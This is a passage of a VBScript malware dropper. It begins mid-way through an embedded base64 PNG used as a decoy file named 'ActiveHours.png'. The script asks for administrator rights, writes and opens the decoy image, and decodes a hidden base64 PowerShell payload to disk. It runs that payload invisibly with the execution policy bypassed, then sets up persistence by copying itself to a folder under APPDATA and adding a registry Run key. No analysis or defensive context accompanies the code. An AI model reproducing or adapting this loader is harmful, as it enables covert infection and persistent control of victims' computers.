j3z/0C+uRL4pE1npBvz+tn/F3x+9E5edNyesvj/+YiccjvA9KUJ+kMDIjOqtnwi6/ubLL4Ba5ZMcxwNTTRn4/pwyPHXHUsyeVgB4V1QzDKblm/D4ihuwYc1KXLrgrKB9O5wufL71I6GPQMgIGiLJCI7jcOYZMzDocIV1fU5GGv68+kYcP92DeeWFnhd5HmBYT7Icy4JhFWAYFoxCMfy6519GwYJhWBw+eQovvr0F22vq/d7jZ1f9EE8++0epHpFIMCivW0a0HzsStrgAwE2XnYeVL7yNptZOzCsvxHO/vhY8PCumeTCjtWAYBuABhmVGzgMMwLCYWVKA/1l9GxqPteCFv3+Iz2sbxtyj6dgJyZ6PSDxoiCQjWo4dEXR9cZ4RTa2eYG7tkWbw4MEw7LB2MGDADH/PgGFZYOT70UJUDOs5f2ZZCV64/1d488l7ceE5Z47co6OrW7LnIxIPEhgZcbqzS9D1KVo1fjYc4L3zp5Vg4PVYPGICxuOxMD7/+p5nGMYzovLxdCpmTMefHl6FN/7f/ahcMBenSGCSGorByIiXn3wIa154LezrM1P1eODfLsf5s0s8QyCf2ArDKgDWJ+bCKsCw7LDHMvy6b4xm5Prh88Mxm/qmE5j7w+ugVquj+OREvEIejIxgdWmCru+12FBdcwDgOM8LPrEVHgCD8Z6L5zzjPT/mda+nM3zecwHmzJhO4pLEkMAkOR5t8MRYGJ/YCjscW2G8w6HhEgwMwwxrkOf1zl4zfvPUK7jkP+7F3zfvGHOeAQNGkxKrRyPiAJpFkhHKFJFp/j6xFR7M8CySd7YIPh7K6Hnv69f/15Po6jMDAH7/xzfg4nj829WLR84zCoXIpyHkgOw9GLvdjmQJMzFKlZhWw56K13NhJnouPucZdnSY1NU3MCIuXr7e1zg6+wSA0aRG8EREoiM7D8bhcGBgYAAWiwUDAwOw2+3QarWYPXs27fETAG/shA0RW2GHRcP7elNz+4S+Fp595ujsEwBFmjH6D0DELQkvMHa7fYyg+Fv7MjQ0BKvVitRUeX+aWq1W4Y2GA7esN3bCDMdOJsRgRs97PZstX9WO6aq8qADLfnwpvFPYYBVg9ekSPBmRqCSswLjdbhw4cAB2e3jlIM1ms+wF5sCBA6Lajc7+hMrc9fVogNyszDF9PP6b26BQqkb6UaRlRfA0hBxIWIGx2+1hiwsADAxMbunIyebUqVOorq4W0dI76xNO5u5Yz+b2pT9CZnoaegesWDh3NmaXlw6388S8lNlFEj4hkYgkrMAIDdxaLBbwPC/LOExXVxeWL1+OoaEhcR34xFZG1yL5ziKNTlHz/HAgGIBCqcSyH1/iSbZTqkamsgEGCoMJjEoj+pkIeZCwAqMQMf05MDAAg8EQBWsmH47jUF9fj88++wwvvfSSaA9tOPQy4rmwYzyX4diLz3lm/HmGAatUejJ5fe1z2CJ7QEIWJKzAiNngK1EFZuDEaVhbOjHY1Q9HnxWOfisaa/fhrQ/eQb/SBU5tByJJN/F6LPCX/8KMxFwm5sUwYBQqMOzEnwU/ZAU3aAarS7z3m5COhBYYlmXBedPcwyAR4jDtX9Sh5dO9aP+iDn2HW2A50RHw2suQM/L/XqUD9akD2J3WC7eg7KbhWaSgmbt+PJfh8zznBs8xYBglMGH0Kb/hKCGMhBUYADAYDOjr6wv7eqvVCo7j4mbnQd7NoaPmEFq27UXrp3vQ/mU9XCI3SctwqXBRnxFzBwz4Mr0H9akD4MP8+564Wnpc5i4mei4ej8YjOp54mBv7Dx7FmWfMgJLhwaZlCV4bRciPhBaYtLQ0QQIDeLyY9PTY52ZYWrvQ8PImNK7/EJaW8MosKMEgC2pkQAUtWAyBgxlOdMMJBzyeXIpbiUW92ehTudCsHQzZ54iHMiH/xSdzl2HgdDrhcFiRasgYnm0aO/v0+J/exOvvbcaWjzahvLiQhkYEABkIjFBiLTDNn9Ri33Pv4tgHX4N3hz+8y4EG+dCNehMA9GChhxJ50KIXThyHBTwYqHgGSzpysCGvDV1qZ9B+ecBnLVLgzN0Bcy+cLhcGh2xITU1DisEIBizMFivu/MPz2L3fk4Pj5hkSF2KEhBYYnU4HhUIBtzv8KvqxiMM4Bmw48Jdq7Hv+XfQcEL7bYg40mAp9kCsYZEINFQw4jAFw4KHiWVzdkYeq3Hb0qwKX0fQ4Ir6zQsOxl3GZu8bsXAwMmGGzWtDf1wOVRofNO3fhiVfegtlCM0aEfxJaYADhwySbzTapcRhLSye2r3oeRzbuENXeACWKgorLKKlQYgbScGhYZFLdSkwb1GOvyhy84YT8FxbgGYAd9WjAssjIzAarTsW2mv14cc2raO0QVkGPSD6STmAAz7KBjAxpdjAMxv6X/4ltK58VHbgFgALoIWQ2JhVKzEQaDqIfbgBzzWnYawgsMN82tePpDVuw4IzpmGIy4oySgpHYinfW6JvGJrR39WHbN/vx6e59op+FSD5kITBCGRgYiKrAuB1OfLxiLepe2RRRP2owSBXxI0qFErNgQCP6keZWIteuxmmN/w3QHG4Ob328C299vGvM6/mmTLR19oqymyC8xMd8bQR44zBCiGYcxtrejbcW3YX9r2wCD0R06CLQ/xSoMBvpYAEUDeoEtydxIaQg4T0YQPgwaXBwEG63W9Ryg2B0NR7HhsWrYGmNj9hEClQ4E+locMV/giEhTxLegwHEDZPM5hCBT4Ec3bILf/3eLzHQ2gleoq9BhD87FogUqHC1LR86zv+PuqioCPn5+RHfhyD8IQuBEbO+SMphUs1zb2PDj/8PBvut4ADJDgtccEggMkZeg/tPzfArMhkZGXjmmWewevVqFBVReQVfmpubsXz5cqxbt85vITMiNLIQGK1WG7M4TNvuRny8+nlwbrdknovv13GIqFLnhxJnCh4cPAesnyoXDMPgggsuwNq1a3Hvvfdi2rRpktwz0dm5cyeqq6vR0tKCxsZGDA6GzowmxiILgQGEezFDQ0NwucLfx9kfvd+14s0rfgPnkB0c+KgcrbCiAyLrvPigmJKBii2/w89vuTnodeeeey6eeuop3HfffSgtLY34vonMzp07AQALFy6E2+1Gby8FvoUiG4GZ7DjMYHc//nb53bB1myOeLQp+MKhHH7ohPpdGkWNA+j9+jYw8E2677Tb86le/Ctlm/vz5ePLJJ/G73/0OM2bMEH3vRMYrMIWFhTG2JHGRxSwSID4fxmgUXvWe5zi8+/NH0PNdi+C2YtmPHlTAiCwIqxKnyDEg9b0VyMgfLe2wbNkyAMBzzz0Xsv3cuXMxd+5c1NfXo6qqCnV1dcIMT1Cam5vR2toKYLS4mZjfsWRHNgLjjcNMxrqk7b//Mw5t+lJUW7FwAPaiG2fDiCxow2qjyEpF6nsrkFU8cZZo2bJlUKvVqK2t9dNyImeddRbOOussVFVVBX2PnU4n2traxtrudMBl7oAyNbCYW+u2AvzExZ/ajByk5pUgdUopNIbJ2wLF670sXbp05DUSGOHIRmAATxxGyDjZbrfD5XIJqo53eNOX2P7InxGLrdzcAPagB/ORhcwQngyboQ8oLl6WLl2KgoICQTb4/sH5w+Vyob194n5J2ak6sJoga6qGdzIYz1BfB4b6OtB1cDe0mbkwlp2DtPzpiHYxK9/4CwDZ70gRLWQTgwHEfcL09/eHfa3b4cSmu9fBzXFRC+qGOlzgUYMu9CHwtCmboUfqO/+JrOlTQz7TwoUL46I+TjgM9Z5G2zebcXTrX9F7dD94d2RB+mCMj7+Q9yKOpBcYIcOk7X94DV1HmqMc1A19uADsDiAyrEGH9LdXIHtmcdjPpdfrE0ZkAMBpG0BH3edo2vIqOhu/htsh7fQxxV+kQ1YCo9VqBRcDD1dguo40Y9tjr8XMcxl/OMFhJzrR7yMyTIoGpnfuROYZwhPmEk1kAE9sp+dILY5u/SvMzYck65fiL9IhK4EBhOfDOByOsLI0P13zZ7gcTkQjmU7slwscdqIDZjjApGhgfOsOpMwKPSwKRCKKDABwLifaaz9G/8mDkvRH8RfpkJ3ARCMfprupGXve2Bz1oY+YwwEeX6ETGW8sR/q8yBPj9Hr9pNTKiQan9m6DwyKsNpA/KP4iHSQwCD1M2vroerhcrpgPiwIddrix49m3BO92GQidTpeYIsNz6D26P6Iu/MVfMjMzgzUhgiCraWoA0Gg0UCgUcDqDF7v2JVipB4d1ELVvbgaPWExMh89QtxnZ2dno7u6WpD+dzlNDRmi1wFhj64ws+XF8/EWtVke8pCSZkZ0HA3jGzBzHhX04HI6A+zrv3fgxXE4XpFwlHY3jsgeXQ6PRIDs7W6J30SMyifbp7bJHVoB8fPzFYDCM7GtOCEeWAmMwGMDzvKAjUD7M7tf+MSkB20i+8s8ux5yfLALg+cTNzs4e3UQtQrRabUKJDKtURdR+fPxFo9GA53lYLJaIbUtGZCswQjwYjuP8Ckz3sVYc+ezbmMdYQh2LH1w+xu5YiAzLslAoFAGPyUJnnCK6rb/4S3p6OhQKBXkxIpFdDAYYXZckJA7T09Mz4bW697cj3n+nyirnoeInF094XaVSITs7G11dXZL8YWi1WkyZEviPNyUlJehWMO7edmjNxwKeN5bPCWkD53bBZjHDau7BkM2/R5FedEbIfgIxPv6iUCig0+nA8zz6+vpgsVhoRkkgsvRgAM8nj9A4jM02dvx+eHtNzIc/ob5+9NAvA74HKpUKJpMpLvbilkKnWYUSqelG5BaWIdM0cQ2VzpiHlBzxVfnGx1+8YqLX66FWq8mLEUHsf/OihFCB4ThuzEJJnudxeEdNzIc/wY7plfNQvmhB0PdBqVQiOzs75iKjiDA2Mh6D0YTMnFGRUWj0yD/3hxH1GSz/xRvXo1iMMGQ5RAI8uQscF/7ez4BnmORdXdxW3wRbX3xX47/y4TvCuk6pVMJkMqGzs1PweyIVUsWDfDFkmjBo6YcqIw95Z1eCVYVXxsIfodYfqdXqES8mNTU1Ks8jR2QrMN51SUKKNfvmkLQ1NIGTxLGPDuWV81FeGdx78UWhUMBkMqGrq0tQzZx4J2/GPGiKQ8dvQhEo/uKLwWBAV1cXxWIEINshEgAYjUbBcRhvVu+pg8diHl8J9nXlQ+F5L754RWYyZ3WiDW+Xpih6oPiLL75eDMViwkPWApOZmSk4H8brxbQfPBbz5LlAR1nlfMxcdK6o94RlWZhMJsGrzuMWThpvLNz1RxSLEYasBUaoB8Nx3IjAtDQ0xdxLCfS15OEVEb0vLMsiOztbPiITIULqv5AXIwxZC4xOp4NGoxEkMJ2dnQCAgc5exHqltL+jvHIBZgqIvQTC68moVNLO7kw2jFJYEXR/hBN/8YW8mPCR/UeY0WhEc3Nz2NdzHOdJqurrj8sg79UiYi+BYBhmJBlPSFJiPNGuzcap3sgWI35wuB38jPnI+f4VAEKvyKcZpfCRvcBkZWXhxIkTgtp0dnbCaY+/rUJnVi7AGYvOk7RPr8h0d3cn3PaoZo7FVYfTYOYiTCc4/9+B8/8dzwNotA7gycLQ0900oxQeshcYk8kUNPfD5XLBah07E9HQ0ABFoTRbZDAA3ENO8IMOcDYHwIn3in7yUGSxl0AwDIOsrKyEEhkzx+KmzhKY/ey3HQnbHGnIyEgJeZ1arYZerycvJgSyFxitVgudTjdBRACgt7cXx44d8zs8yLp+oeS28DwPZ1svhg61Y/BgGzhr+Ls1zrn8QsyS2HvxxevJWCyWiHa8nAxaXSqs6C7EAaf4xLpApCkZqNXq8K5NS4PNZiMvJggMnwSh8JqaGhw/fnzMaz09PWhqaoqRRZ7dIW11zTB/cdDj2YTgD3veQfHZsybBMsDtdsNqtQb1ZrxBcS8ajSbopzg71A+lbeKC0mCcHAJsPh5fJ6fGt04DapzR+2O+t0SBWSnheyN2ux1utxt6fZA9nyJErVZDo4k8mB0LkkJgTpw4gV27do15raGhAYOD0m53IQbO4YT56yMY2N0EJsBmYvOvvgS/ee/5SbYsOK2trTh16lSszUgKcnJyEnZ/bFlPU3vJzc2dMB1tt4vfTF5KWLUKGZWzYbrue2D0Kr95L//6UOjN6gkiHkkKgdFqtdDr9WMEJt7yP7RF2cj7xSIwBu2YFdPzrr4EJZM0NCIIqUkKgQE8bqavwMTj/j+KFC1yr7sQjFY1klh37UO/jrVZBCGapBGY8cOk7OxswZu0TQaqjBSYrjkPHHjMJ++FSHBkP03tJS8vb0I+zNSpU9HX1xdwtkStVKH+7U8juzEDKA16aHLSockJb68h3dRspMwqwM/IeyESnKQRGJ1Oh9TU1Ak5HsG8GIZh0FvTBM4hzb446qw0ZC6cCcOs0DMCeYvnoWjOTEnuSxCxImkEBgCmTJkScHsSf/A8j9mXL0TdB59Jcn97txmn/vkN+vcdw5Qrz4UyNfCCOl6twJ49e7BgQeQLG6OBwWBIiOzVkydPBs3kzs/PDzuxLlakpITOLI5Xkkpg8vLy0NjYKKhN0QVzsP+DHZLaYWvuROt7X6No2SIwQWrl1tfXx63ApKWlJUT26osvvhg0JeHOO+9Efn7+JFqUXCSVwEyZMkVwTdpBDY/29CjUsbV1Q9HwHabOKQ94SWNjI55++mlJPQXeOYTFld/D7DnngNWmAKx8qtsR8UdSCYxer4fBYBC037JSo0avSRmVcgb9RxuDCgwAbNiwAadPn5b0vgV6BmXpnh+9IjMfKlMRCQ0RFZJmmtpLfn6+oAJUDMNg6tSpUbHFbreP2SrFH9Fc4wIA7t422E/USVbbliB8IYEJ44jmOpBQK5ejLTCAp3C2o+2IZPVtCcJLUg2RAKCoqEhwHMa7V1I0CFV/ZbJW0fJ2K1w9rVBmi98ZkSDGk3QejEajEbzbQE5OTtytXYoGrp62WJtAyIykExjAk8ErZIjE83zU4jBxBecGZws/T4ggQpF0QyTAIzC1tbWC2hQUFODYsWNRsmhy+aSmAa1m/7khF10MnLfwwkm2iJArSSkwYuIwU6ZMiZI1k8+WbZ+hevvnfs81fHcSNrsTixYtmmSrCDmSlEMkrVYreFO2rKysuE8plwKO4/Db3/4WO3ZIm71MJCdJKTDAqBcj5EiWlHK3243777+fRIaIGBIYEhi/kMgQUpC0AlNSUiJYYHJzc2Nt9qRCIkNEStIKjFarRU5OjqB8mIyMjKSIw/hCIkNEQtIKDAAUFxfTMCkMSGQIsSS1wNAwKXxIZAgxJGUejJfS0lLB+TDl5eWYM2eOZDYMDQ0FXY80a9YszJs3T3C/DQ0N+OqrryIxbQJekVmzZg0qKysl7ZuQJ0ktMGq1Grm5uWhvbxfUzt8+12IJJXAul0vU/crLy/H111+LNSsgJDKEEJJ6iAQA06ZNEzxMkvIItXMvz/NR6TcSaLhEhEvSC8z06dNJYERAIkOEQ9ILTFlZmaCpaqmPcIhWv5FCIkOEIukFRqPRjBQDj0cPJlr9SgWJDBGMpBcYwOPFxEpg3O7gZSrdbndcC4zXRhIZwh8kMBidro6VwLhc/neOFCsuky0wXltJZIjxkMDAM6UbK4HhOA52ux1Op3NEGNxuN5xOJ4aGhhJGYAASGWIiJDDwxGHELBuQ6uB5Hna7HTabDVarFYODg7Db7aJnkGIlMACJDDEWEphhbrzxRuh0uph6MlIesYREhvCS1Jm8vuTn5+O+++7Drl27QgZehdDV1YX6+vqA58vKyqJSUHzXrl2i2lVWVuLEiRMYHByM6P6U8UsAJDBjyMrKwhVXXCFpnw0NDThw4EDA8xUVFbjwQumLbO/Zs0dUu+LiYqxbtw4rV64kkSEihoZIxAQqKiqwbt066HS6iPui4VJyQwJD+IVEhpACEhgiICQyRKSQwBBBIZEhIoEEhggJiQwhFhIYIixIZAgxkMAQYUMiQwiFBIYQBIkMIQQSGEIwUovM6tWr8cgjj0hgGRFvkMAQopBKZBwOBzo7O7F+/XoSGRlCAkOIpqKiAmvXrhUtMg6HAz09PSMrvzds2CCofW1zJx7d9CX++nkt3ttdh799uRfffNcs6VoyIjJIYIiImDt3rihPZry4pKSkoHrD6/jvbXuxcW9TyPY7Dp2AzmnFLedMw6WleThvahYumZaDAp0CX9QfFvUshPSQwBARI3S45E9cNr/yFIyKITy2ZTeW/aUanx5pCdi++mAz7nr3CzBgJpz77EgLWJ5DX1+fuIchJIVWUxOS4BWZUKuwx4tLakoKPnrlKZgyDQAABjxcHI8lL2/CgsIcv33sPnkag043Fr/+Kdb/5HycmZsBwCMuRZmpKMnOgM1mg1qtlvgpCaGQwBCSEUpk/InLh396YkRcAODW2UY8UdsBq8OFHd+1Bb1fc78N1274AhuvuwjdZgumZRlQaPT0pdfrodfrJXw6Qgw0RCIkJdBwKZC45GRljrmu2JQl6H79Q068suvABHHJyMiI4CkIqSCBISRnvMiEKy5VrW6s2BK4OJc/rio1YdVFZ5K4xCkkMERU8IoMy7LhicvJIdz0QR2ElCq/qtSE315cQeISx5DAEFGjoqICS5cuDSkuG48P4qYPD4oSl6kkLnENBXmJqHL33XeD53m89tprqN70PjIGTwPcaCLcxuOD+PnmQyQuMoU8GJnicrnAsqzgw+l0Sm7LqlWrsH//fuQVToOmeA7AKgCIF5ffXTqXxCVBIA9Gphw+fBi5ubmC2x09ejQK1ozCaFKgKZ6DN3bsHBGXmcYU/PGyWUhTK7G9uQf3bPefibuk1IQHLp2L/Iw0ACQuiQB5MMSks6GhbUzMZdX8YqSpPZ91iwqNmJ9rmNBmSakJD/7gbBKXBIMEhogJLDOa5m9xjl2cOP57r7jkpacCIHFJJGiIJFPWrFmDtmNH4O47HXYbhSELs+cvjKJVHq6fVw6NUoGfvbYZLo7Hn/a3IFWlwExjCj74rgOHeqwj15K4JDYkMDKltLQUJTnpcLYeCrvNQT4TjC4lilaNck3FdLx36xW4Zv1HONRjxe1bGydcs6TUhId+cDZySVwSFhoiEQCAD0/0Y95L27DzePgeT6T8+MwSbLr9SmgUE38NSVzkAXkwMqWpqx8nT3XD1esK6/p1+7rBA7C7JrdY02UzC7H5jiX44Yv/gN3NAQCuLsvBg5fOJXGRASQwMuXZz/bjmc/2C2531zufY0FRDgozUqNglX8WlRVg8x1LcMVLH2BxcRYevuxsmNI8QzUSl8SGhkjEGJr7LPiXZ95Bu9k2qfddVFaAT395FR68dC6Ji4wggSEmcLxnAJXPvINOS+DCUdHggtICzCyeCoDERS7QECnKKJVKpKenBzwfr1XXjnT1o/LZd/H1yqVI102ejXq9HkqlMm7fF0IYDO9d6koIwmw2o6qqClVVVWhsnDjFKhVTp07F4sWLcfPNN6OwsDDsdne987moGIw/qq7/PhYWZQMAatr7cH5Z0UgAViqqqqpQXV2N+vp6tLUFr2QXrxiNRpSVlaG0tBSXX345Fi1aFGuTYg4JjAgaGhpw++23o6UlcGHqaLBy5UqsXLkyrGujJTAAMGB3IsNoRG56WsR9v//++3j88cfR3t4ecV/xRmVlJZ577jmkpUX+PiUqFIMRSENDA2644YZJFxcAWLduHe65555Jv+940jQqNJxojbif1atX46677pKluADAjh07cM0116CzszPWpsQMEhgBmM1m3HDDDTCbzTGzoaqqCmvXro3Z/b2ckW1Ae59FdPvXX38dGzdulNCi+KSpqQm33HJLrM2IGRTkFcD69etjKi5eXn31Vdx6660wGCauOvaSqmRwVrY0cZLWXjNqmYkj6awsN6aIyJdpb2/HE088IYVpCUFdXR2qq6uxePHiWJsy6ZDACGDr1q2xNgGAx5PasmULrr322oDX/KjYiJ8WRL45/SgTM4L1anEO8LvvvgubbXLzbGLN+vXrSWCI4ERztkgooWJAc0oKYLVag14TKUajUVS7mpoaiS2Jf/bt2xdrE2ICCUyYdHR04Oabb461GSOE+uPWarVQKBRRtUGpFPfrc/7556M8wSm0AAAALElEQVSkpERia4h4hKapCYKIGjSLRBBE1CCBIQgiapDAEAQRNUhgCIKIGv8L0Ma6dHbhmcAAAAAASUVORK5CYII=")
Dim arrFrontName
arrFrontName = Array("ActiveHours.png")


If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
    if autorun = "True" Then
        DoAutoRun
    end if
End If

Function GetFilePath(fileName)
    Dim fso, scriptPath, scriptFolder, fullPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    scriptPath = WScript.ScriptFullName
    scriptFolder = fso.GetParentFolderName(scriptPath)
    fullPath = fso.BuildPath(scriptFolder, fileName)
    Set fso = Nothing
    GetFilePath = fullPath
End Function

Function ExecuteFileAsync(filePath)
    Dim shell, result
    Set shell = CreateObject("WScript.Shell")
    result = shell.Run(filePath, 1, False)
    Set shell = Nothing
    ExecuteFileAsync = result
End Function

Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    ' Create an XML element with the base64 string
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    
    ' Get the decoded binary data
    Dim binaryData
    binaryData = node.nodeTypedValue
    
    ' Create a binary stream object to save the binary data to a file
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
    
    ' Save the binary stream to the specified output file path
    stream.SaveToFile outputFilePath, 2 ' adSaveCreateOverWrite
    stream.Close
    
    ' Clean up
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function

Sub MainScriptLogic()

    For i = 0 To UBound(arrFrontName)
        data = arrFrontData(i)
        exe = GetFilePath(arrFrontName(i))
        DecodeBase64ToFile data, exe
        ExecuteFileAsync exe
    Next

    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    Dim scriptFullPath
    scriptFullPath = WScript.ScriptFullName
    Dim psScriptPath
    psScriptPath = Left(scriptFullPath, Len(scriptFullPath) - 3) & "ps1"
    DecodeBase64ToFile bodyX, psScriptPath
    Dim command
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psScriptPath & """"
    ' Using Run method with window style 0 to run the command invisibly
    objShell.Run command, 0, True
    ' Delete the PowerShell script file and itself if selfDel is "yes"
    If selfDel = "yes" Then
        'Dim fso
        'Set fso = CreateObject("Scripting.FileSystemObject")
        'If fso.FileExists(psScriptPath) Then
        '    fso.DeleteFile psScriptPath
        'End If   
        ' Schedule self-deletion using cmd and timeout
        'Dim deleteCommand
        'deleteCommand = "cmd /c timeout 2 > NUL & del """ & scriptFullPath & """"
        'objShell.Run deleteCommand, 0, False
        'Set fso = Nothing
    End If
    Set objShell = Nothing
End Sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub


Sub DoAutoRun()
    Dim fso, shell, scriptPath, destFolder, destPath, registryKey
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
    destPath = fso.BuildPath(destFolder, fso.GetFileName(scriptPath))
    CreateFolder fso, destFolder
    CopyScript fso, scriptPath, destPath
    SetAutorun shell, destPath
    Set shell = Nothing
    Set fso = Nothing
End Sub

Sub CreateFolder(fso, folderPath)
    If Not fso.FolderExists(folderPath) Then
        fso.CreateFolder(folderPath)
    End If
End Sub

Sub CopyScript(fso, sourcePath, destinationPath)
    fso.CopyFile sourcePath, destinationPath, True
End Sub

Sub SetAutorun(shell, scriptPath)
    Dim registryKey, registryValue
    registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
    registryValue = "HefestAppVbs"
    shell.RegWrite registryKey & registryValue, """" & scriptPath & """", "REG_SZ"
End Sub
